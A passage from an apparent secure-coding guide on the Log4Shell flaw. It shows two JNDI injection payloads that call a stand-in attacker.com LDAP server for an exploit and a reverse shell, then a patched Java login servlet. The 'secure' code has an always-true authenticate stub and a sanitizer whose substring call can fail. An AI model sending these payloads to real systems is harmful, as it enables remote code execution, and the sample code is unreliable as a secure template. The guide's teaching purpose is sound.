```

**Attack Payload**:
```text
Username: ${jndi:ldap://attacker.com:1389/Exploit}
User-Agent: ${jndi:ldap://attacker.com:1389/ReverseShell}
```

**Why This Is Dangerous**:
- Log4j 2.x versions before 2.17.0 process JNDI lookups in log messages
- Attacker-controlled strings containing `${jndi:ldap://...}` trigger remote class loading
- The malicious class executes arbitrary code with application privileges
- No authentication required - simply sending the payload anywhere it gets logged
- User-Agent headers, form fields, and any logged data can be exploited

**SECURE VERSION**:

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.regex.Pattern;

// pom.xml uses patched version:
// <dependency>
//     <groupId>org.apache.logging.log4j</groupId>
//     <artifactId>log4j-core</artifactId>
//     <version>2.21.1</version>  <!-- PATCHED VERSION -->
// </dependency>

public class SecureLoginServlet extends HttpServlet {
    private static final Logger logger = LogManager.getLogger(SecureLoginServlet.class);
    private static final Pattern SAFE_USERNAME = Pattern.compile("^[a-zA-Z0-9_@.\\-]{1,100}$");
    private static final int MAX_HEADER_LENGTH = 500;

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {
        String username = sanitizeForLogging(request.getParameter("username"));
        String userAgent = truncate(request.getHeader("User-Agent"), MAX_HEADER_LENGTH);

        // SECURE: Sanitized input with parameterized logging
        logger.info("Login attempt for user: {}", username);
        logger.debug("User-Agent: {}", sanitizeForLogging(userAgent));

        String rawUsername = request.getParameter("username");
        if (!isValidUsername(rawUsername)) {
            logger.warn("Invalid username format attempted");
            response.sendRedirect("/login?error=invalid");
            return;
        }

        if (authenticate(rawUsername, request.getParameter("password"))) {
            logger.info("Successful login for user ID: {}", hashUsername(rawUsername));
            response.sendRedirect("/dashboard");
        } else {
            logger.warn("Failed login attempt - invalid credentials");
            response.sendRedirect("/login?error=true");
        }
    }

    private String sanitizeForLogging(String input) {
        if (input == null) return "[null]";
        // Remove JNDI lookup patterns and control characters
        return input.replaceAll("\\$\\{[^}]*\\}", "[REMOVED]")
                    .replaceAll("[\\x00-\\x1f\\x7f]", "")
                    .substring(0, Math.min(input.length(), 200));
    }

    private String truncate(String input, int maxLength) {
        if (input == null) return "[null]";
        return input.length() > maxLength ? input.substring(0, maxLength) + "..." : input;
    }

    private boolean isValidUsername(String username) {
        return username != null && SAFE_USERNAME.matcher(username).matches();
    }

    private String hashUsername(String username) {
        // Return hashed identifier for audit logs
        return Integer.toHexString(username.hashCode());
    }

    private boolean authenticate(String username, String password) {
        return true;
    }
}
```

**Key Security Controls**:
- **Updated Dependency**: Log4j 2.21.1 has JNDI lookups disabled by default and contains all security patches
- **Input Sanitization**: Strips `${...}` patterns before logging to provide defense in depth
- **Parameterized Logging**: Uses `{}` placeholders instead of string concatenation
- **Input Validation**: Validates username format before processing
- **Data Minimization**: Logs hashed identifiers instead of raw usernames for privacy

